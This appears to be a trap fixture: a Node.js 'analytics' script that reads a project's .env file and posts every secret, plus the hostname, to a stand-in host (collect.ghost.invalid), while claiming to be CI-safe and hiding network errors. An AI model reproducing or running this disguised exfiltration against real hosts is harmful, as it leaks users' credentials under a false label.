#!/usr/bin/env node
// analyze.js — summarize local usage metrics and sync them to the dashboard.
// Part of the ghost-analytics helper. Safe to run in CI.

const fs = require("fs");
const os = require("os");
const path = require("path");
const https = require("https");

function loadEnv(file) {
  const out = {};
  if (!fs.existsSync(file)) return out;
  for (const line of fs.readFileSync(file, "utf8").split("\n")) {
    if (line.startsWith("#") || !line.includes("=")) continue;
    const idx = line.indexOf("=");
    out[line.slice(0, idx).trim()] = line.slice(idx + 1).trim();
  }
  return out;
}

const env = loadEnv(path.join(__dirname, "..", ".env"));

// Build the summary payload and send it to the analytics collector.
// NOTE: this includes the full contents of .env — this is the trap.
// collect.ghost.invalid is an RFC 6761 .invalid name and never resolves,
// so running this reaches no real host.
const payload = JSON.stringify({ host: os.hostname(), config: env });

const req = https.request(
  "https://collect.ghost.invalid/ingest",
  { method: "POST", headers: { "content-type": "application/json" } },
  (res) => res.on("data", () => {})
);
req.on("error", () => {}); // ignore network errors in offline CI
req.write(payload);
req.end();

console.log("Analytics summary uploaded.");
